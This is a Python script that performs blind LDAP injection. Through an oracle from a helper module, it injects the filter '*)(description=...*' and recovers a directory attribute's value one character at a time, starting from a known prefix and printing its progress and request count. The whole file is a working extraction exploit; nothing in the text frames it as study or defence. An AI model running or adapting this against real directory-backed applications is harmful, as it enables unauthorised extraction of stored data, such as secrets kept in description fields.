#!/usr/bin/env python3
"""Continue extraction of the description value from a known prefix."""
import sys
import time

import pool_extract as P

P.init_pool()

FULL = (list("abcdefghijklmnopqrstuvwxyz")
        + list("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        + list("0123456789")
        + list("_-!@#$%^&*+=.,?/|~ ()[]{}:;'\"`")
        + ["\n", "\r", "\t", " "])
# note: '*', '(', ')' and '\\' are handled via LDAP hex escapes by pool_extract.esc


def scan(prefix, maxlen=60):
    val = prefix
    t0 = time.time()
    while len(val) < maxlen:
        hit = None
        for c in FULL:
            if P.oracle(f"*)(description={P.esc(val + c)}*"):
                hit = c
                break
        if hit is None:
            break
        val += hit
        print(f"    {val!r}   [{P.REQ[0]} req, {time.time()-t0:.0f}s]", flush=True)
    print(f"  END: {val!r}", flush=True)
    return val


if __name__ == "__main__":
    pre = sys.argv[1] if len(sys.argv) > 1 else ""
    v = scan(pre)
    print(f"\nEXTRACTED: {v!r}", flush=True)
    print(f"requests: {P.REQ[0]}", flush=True)
